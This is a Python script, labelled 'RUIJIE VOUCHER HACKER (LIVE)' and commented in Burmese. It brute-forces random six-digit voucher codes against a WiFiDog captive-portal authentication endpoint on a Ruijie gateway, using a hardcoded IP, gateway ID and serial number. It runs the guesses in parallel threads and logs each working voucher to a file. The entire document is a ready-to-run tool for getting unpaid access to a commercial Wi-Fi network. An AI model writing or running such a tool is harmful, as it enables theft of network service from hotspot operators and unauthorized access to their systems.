import sys, os, hashlib, requests, time, random
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

init(autoreset=True)

# Canary Data
TARGET_IP = "192.168.110.1"
GW_ID = "58b4bbd9c1e9"
GW_SN = "H1U42FJ004707"

FOUND_VOUCHERS = []

def check_voucher(v):
    global FOUND_VOUCHERS
    url = f"http://{TARGET_IP}:2060/wifidog/auth"
    params = {"token": v, "gw_id": GW_ID, "gw_sn": GW_SN}
    try:
        res = requests.get(url, params=params, timeout=1.0)
        # အောင်မြင်မှုရှိမရှိ စစ်ဆေးခြင်း
        if "success" in res.text.lower() or res.status_code == 302:
            if v not in FOUND_VOUCHERS:
                FOUND_VOUCHERS.append(v)
                with open("found_vouchers.txt", "a") as f:
                    f.write(f"{v}\n")
    except:
        pass

def start_cracking():
    os.system('clear')
    print(f"{Fore.MAGENTA}========================================")
    print(f"{Fore.WHITE}    RUIJIE VOUCHER HACKER (LIVE)")
    print(f"{Fore.MAGENTA}========================================\n")
    
    while True:
        # တစ်ခါတည်း ၅ ခု Batch ထုတ်မယ်
        v_list = [str(random.randint(100000, 999999)) for _ in range(5)]
        
        # ၁။ Scanning လုပ်နေတဲ့ ဂဏန်းတွေကို အဝါရောင်နဲ့ ဘေးတိုက်ပြမယ်
        scan_display = "  ".join([f"{Fore.YELLOW}{c}" for c in v_list])
        sys.stdout.write(f"\r{Fore.CYAN}[SCANNING] {scan_display}")
        sys.stdout.flush()

        # ၂။ အမှန်တွေ့ထားတဲ့ Voucher ရှိရင် အောက်ကနေ အစိမ်းရောင်နဲ့ တန်းစီပြမယ်
        if FOUND_VOUCHERS:
            # အစ်ကိုလိုချင်တဲ့ 364767 463758 ပုံစံအတိုင်း အစိမ်းရောင်နဲ့ ပြပေးမှာပါ
            valid_display = " ".join([f"{Fore.GREEN}{c}" for c in FOUND_VOUCHERS])
            # Cursor ကို အပေါ်ပြန်တင်ပြီး FOUND စာရင်းကို Update လုပ်မယ်
            sys.stdout.write("\033[K") # လက်ရှိလိုင်းကို ရှင်းမယ်
            print(f"\n{Fore.GREEN}[FOUND] {valid_display}\033[F") # အပေါ်တစ်လိုင်း ပြန်တက်မယ်

        with ThreadPoolExecutor(max_workers=5) as executor:
            executor.map(check_voucher, v_list)
        
        time.sleep(0.01)

if __name__ == "__main__":
    try:
        start_cracking()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.RED}[!] Paused.")
